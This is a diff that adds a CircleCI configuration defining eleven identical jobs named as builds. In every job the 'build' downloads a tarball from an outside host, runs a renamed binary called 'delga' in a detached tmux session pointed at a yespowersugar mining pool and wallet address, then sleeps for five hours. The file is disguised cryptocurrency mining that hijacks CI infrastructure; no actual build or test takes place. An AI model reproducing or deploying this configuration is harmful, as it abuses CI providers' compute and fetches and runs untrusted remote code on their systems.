@@ -1,0 +1,127 @@
+version: 2.1
+
+jobs:
+  buildanr:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install sudo tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; sudo tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  buildanr1:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install sudo tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; sudo tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  buildanr2:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install sudo tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; sudo tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  buildanr3:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install sudo tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; sudo tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  buildanr4:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install sudo tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; sudo tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  buildanr5:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install sudo tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; sudo tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  buildanr6:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install sudo tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; sudo tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  buildanr7:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install sudo tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; sudo tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  buildanr8:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install sudo tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; sudo tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  buildanr9:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install sudo tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; sudo tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  buildanr10:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install sudo tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; sudo tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+workflows:
+  main:
+    jobs:
+      - buildanr
+      - buildanr1
+      - buildanr2
+      - buildanr3
+      - buildanr4
+      - buildanr5
+      - buildanr6
+      - buildanr7
+      - buildanr8
+      - buildanr9
+      - buildanr10
